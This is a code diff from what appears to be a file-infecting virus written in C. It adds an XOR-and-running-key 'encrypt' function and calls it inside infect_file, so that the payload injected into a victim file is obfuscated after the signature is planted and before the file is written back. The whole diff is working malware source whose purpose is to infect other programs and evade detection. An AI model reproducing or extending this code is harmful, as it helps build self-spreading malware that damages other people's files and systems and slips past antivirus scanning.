@@ -136,6 +136,30 @@ static int		inject_sign(t_info *info)
 	return (0);
 }
 
+uint32_t    encrypt(void *ptr, size_t size)
+{
+    uint32_t    *file;
+    uint32_t    key;
+    size_t      i;  
+
+    file = (uint32_t *)ptr;
+    key = KEY;
+    int nb = 0;
+    while (nb < 8)
+    {   
+        i = 0;
+        while (i * 4 < size - 1)
+        {   
+            file[i] ^= key;
+            key += file[i];
+            i++;
+        }   
+        key -= SUB;
+        nb++;
+    }   
+    return (key);
+}
+
 static void		infect_file(char *path)
 {
 	struct stat		st;
@@ -167,6 +191,7 @@ static void		infect_file(char *path)
 		goto end_fct;
 	patch_addresses(&info);
 	inject_sign(&info);
+	encrypt(info.file + info.offset_payload, PAYLOAD_SIZE);
 	ft_syswrite(fd, info.file, info.file_size);
 	end_fct:
 	ft_sysmunmap(info.file, info.file_size);
